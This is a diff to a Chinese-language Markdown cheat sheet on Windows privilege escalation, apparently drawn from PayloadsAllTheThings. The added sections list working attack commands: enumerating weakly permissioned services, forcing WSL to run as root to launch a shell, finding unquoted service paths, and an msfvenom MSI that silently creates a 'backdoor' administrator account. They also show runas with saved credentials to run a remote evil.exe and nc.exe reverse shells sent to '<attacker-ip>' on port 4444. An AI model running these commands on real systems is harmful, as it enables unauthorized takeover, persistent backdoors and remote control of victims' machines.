@@ -7,7 +7,7 @@
 本地提权(LPE, Local Privilege Escalation)
 
 
-### Checklists - linux 提权之前必要信息搜集
+### Checklists - Windows提权之前必要信息搜集
 
 
 Windows 版本和配置
@@ -198,9 +198,10 @@ Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
 
 ```
 
-### EoP
+### EoP - Windows各种提权方式
 
-密码
+#### EoP - 密码搜集
+
 ```
 # ---------------
 # SAM and SYSTEM files
@@ -425,19 +426,182 @@ dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
 
 ```
 
-Incorrect permissions in services
+#### EoP - Incorrect permissions in services
+
 服务中的不正确权限
 
+```
+# ---------------
+# A service running as Administrator/SYSTEM with incorrect file permissions might allow EoP. You can replace the binary, restart the service and get system.
+# 以Administrator/SYSTEM身份运行且具有不正确文件权限的服务可能允许EoP(权限提升)。你可以替换二进制文件，并重新启动服务，实现权限提升。
+
+# Often, services are pointing to writeable locations:
+# 通常，服务指向可写位置：
+
+# 1.Orphaned installs, not installed anymore but still exist in startup(孤儿installs,即现在并没有安装但仍存在于startup中)
+# 2.DLL Hijacking
+# 3.PATH directories with weak permissions(具有弱权限的PATH目录)
+
+
+$ for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+$ for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
+
+$ sc query state=all | findstr "SERVICE_NAME:" >> Servicenames.txt
+FOR /F %i in (Servicenames.txt) DO echo %i
+type Servicenames.txt
+FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt
+FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
+
+
+# Alternatively you can use the Metasploit exploit : exploit/windows/local/service_permissions
+# 或者，您可以使用Metasploit的：exploit/windows/local/service_permissions
+
+# 注意 检查权限的命令为
+icacls (Windows Vista +)
+cacls (Windows XP)
+
+# 期望找到的是
+BUILTIN\Users:(F)   -  (Full access)
+BUILTIN\Users:(M)   -  (Modify access)
+BUILTIN\Users:(W)   -   (Write-only access)
+```
+
+
+#### EoP - Windows Subsystem for Linux (WSL)
+
+Windows子系统
+```
+# ---------------
+# With root privileges Windows Subsystem for Linux (WSL) allows users to create a bind shell on any port (no elevation needed). 
+# 使用root权限的Windows Subsystem for Linux（WSL）允许用户在任何端口上创建bind shell（无需权限提升）
+
+# Don't know the root password? No problem just set the default user to root W/ .exe --default-user root.
+# 不知道root的密码也没问题，只需将默认用户设置为root
+
+# Now start your bind shell or reverse.
+# 启动bind shell或 reverse shell
+
+
+wsl whoami
+./ubuntun1604.exe config --default-user root
+wsl whoami
+wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
+
+
+# 二进制bash.exe文件在C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe
+
+# Alternatively you can explore the WSL filesystem in the folder 
+# 或者，您可以在文件夹中浏览WSL的文件系统
+
+C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\
+
+```
+
+#### EoP - Unquoted Service Paths
+
+EoP - 不带引号的服务路径
+```
+# ---------------
+
+# The Microsoft Windows Unquoted Service Path Enumeration Vulnerability. 
+# Microsoft Windows未加引号的服务路径枚举漏洞。 
+
+# All Windows services have a Path to its executable. If that path is unquoted and contains whitespace or other separators, then the service will attempt to access a resource in the parent path first.
+# 所有Windows服务都有一个可执行文件的路径。如果该路径未加引号并包含空格或其他分隔符，则服务将首先尝试访问父路径中的资源。
+
+wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+
+gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
+
+# Metasploit provides the exploit : exploit/windows/local/trusted_service_path
+
+
+# 例如 对于 C:\Program Files\something\legit.exe 这一路径 Windows将首先尝试以下路径：
+C:\Program.exe
+C:\Program Files.exe
+```
+
+EoP - Kernel Exploitation
+
+EoP - 内核利用
+
+利用内核漏洞 参考合集 https://github.com/SecWiki/windows-kernel-exploits
 
 
 
+#### EoP - AlwaysInstallElevated
+```
+# ---------------
+# Check if these registry values are set to "1".
+# 检查这些注册表值是否设置为“1”。
+
+$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+# Then create an MSI package and install it.
+# 然后创建一个MSI包并安装它。
+
+$ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
+$ msiexec /quiet /qn /i C:\evil.msi
+
+# 可以使用Metasploit的 exploit/windows/local/always_install_elevated
+```
 
 
-### Windows提权
+EoP - Insecure GUI apps
+
+EoP - 不安全的GUI应用程序
+```
+# ---------------
+# Application running as SYSTEM allowing an user to spawn a CMD, or browse directories.
+# 作为SYSTEM运行的应用程序允许用户生成CMD或浏览目录。
+
+# Example: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"
+# 示例：“Windows帮助和支持”（Windows + F1），搜索“命令提示符”，单击“单击以打开命令提示符”
 
 
-Common Vulnerabilities and Exposures
+
+```
+
+
+#### EoP - Runas
+
+```
+# ---------------
+# Use the cmdkey to list the stored credentials on the machine.
+# 使用cmdkey列出计算机上存储的凭据
+
+cmdkey /list
+如结果
+Currently stored credentials:
+ Target: Domain:interactive=WORKGROUP\Administrator
+ Type: Domain Password
+ User: WORKGROUP\Administrator
+
+
+# Then you can use runas with the /savecred options in order to use the saved credentials. 
+# The following example is calling a remote binary via an SMB share.
+# 然后，您可以用runas 的 /savecred 选项，以便使用保存的凭据。
+# 以下示例通过SMB共享调用远程二进制文件。
+
+runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+
+
+# Using runas with a provided set of credential.
+
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
+
+
+$ secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force
+$ mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)
+$ computer = "<hostname>"
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
+```
+
+#### EoP - Common Vulnerabilities and Exposure
+
 通用漏洞
+
 |名称|类型|适用环境|描述|
 |:-------------:|--|--|-----|
 |Token Impersonation (RottenPotato)|/|/|/|
@@ -446,5 +610,9 @@ Common Vulnerabilities and Exposures
 |MS17-010 (Eternal Blue)|系统漏洞|/|Windows Kernel Mode Drivers|windows 7/2008/2003/XP|补丁编号: KB4013389|
 |CVE-2018-8120|Kernel Exploitation|(Windows 7 SP1/2008 SP2,2008 R2 SP1)x86 x64|[Win32k Elevation of Privilege Vulnerability]|
 |[Win10Pcap-Exploit](https://github.com/Rootkitsmm/Win10Pcap-Exploit)|应用程序漏洞|win10|Exploit Win10Pcap Driver to enable some Privilege in our process token ( local Privilege escalation)|
+
+
+检查补丁是否安装 `wmic qfe list | findstr "3139914"`
+
 
 详细参考 [PayloadsAllTheThings/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#token-impersonation-rottenpotato)
